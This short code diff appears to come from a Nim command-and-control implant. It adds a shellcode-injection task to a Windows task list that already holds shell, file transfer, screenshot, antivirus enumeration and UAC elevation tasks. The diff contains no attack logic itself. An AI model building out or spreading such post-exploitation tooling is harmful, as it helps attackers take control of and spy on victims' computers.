@@ -4,7 +4,7 @@ import download, shell, upload
 
 # import windows exclusive tasks
 when defined(windows):
-  import tokinfo, msgbox, processes, screenshot, antiviruses, uac_elv, dotnet_info
+  import tokinfo, msgbox, processes, screenshot, antiviruses, uac_elv, dotnet_info, inject_shellcode
 
 var tasks*: seq[tuple[
   name: string, 
@@ -24,4 +24,5 @@ when defined(windows):
   tasks.add((name: "antiviruses", execute: antiviruses.executeTask))
   tasks.add((name: "uac_elv", execute: uac_elv.executeTask))
   tasks.add((name: "dotnet_info", execute: dotnet_info.executeTask))
+  tasks.add((name: "inject_shellcode", execute: inject_shellcode.executeTask))
   # tasks.add((name: "dumpprocess", execute: dumpprocess.executeTask))
